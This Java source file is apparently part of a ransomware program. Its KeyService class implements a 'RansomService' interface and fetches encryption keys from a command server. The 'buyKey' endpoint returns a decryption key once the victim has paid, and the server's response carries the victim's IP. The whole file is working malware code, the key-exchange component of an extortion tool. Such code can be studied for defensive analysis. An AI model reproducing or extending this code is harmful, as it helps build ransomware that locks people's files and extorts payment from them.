package Agent.services;

import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import org.json.JSONObject;

import Agent.Utils.HttpUtil;
import Agent.entites.CryptoKey;
import Agent.exceptions.CryptoException;
import Agent.exceptions.HttpResException;
import Agent.exceptions.InOutException;
import Agent.exceptions.JsonException;

public class KeyService implements RansomService {

	@Override
	public CryptoKey getKey() throws CryptoException {
		return sendRequest("http://localhost:8080/requestKey");
	}

	@Override
	public CryptoKey buyKey() throws CryptoException {
		return sendRequest("http://localhost:8080/buyKey");
	}

	private CryptoKey sendRequest(String url) throws CryptoException {
		try {
			JSONObject json = (JSONObject) HttpUtil.get(url);
			String al = json.get("algorithm").toString();
			byte[] decodedKey = json.get("_key").toString().getBytes();
			SecretKey k = new SecretKeySpec(decodedKey, 0, decodedKey.length, al);
			return new CryptoKey(json.get("ip").toString(), k, al);
		} catch (InOutException | HttpResException | JsonException e) {
			throw new CryptoException("Request denied");
		}
	}
}